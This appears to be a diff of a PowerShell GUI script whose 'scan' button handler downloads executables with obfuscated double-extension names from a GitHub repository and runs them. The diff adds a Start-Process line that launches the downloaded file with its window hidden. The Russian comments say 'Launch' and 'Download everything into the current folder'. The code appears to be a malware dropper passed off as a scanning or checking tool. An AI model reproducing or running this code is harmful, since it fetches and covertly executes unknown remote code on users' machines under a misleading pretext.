@@ -164,8 +164,8 @@ $scan = {
     Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
     
     
-    # Запускаем 
-
+    # Запускаем
+    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
     
     # Скачиваем everything в текущую папку
     Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
@@ -198,5 +198,6 @@ $btn.Add_Click($scan)
 
 # Запуск
 [void]$form.ShowDialog()
+
 
 
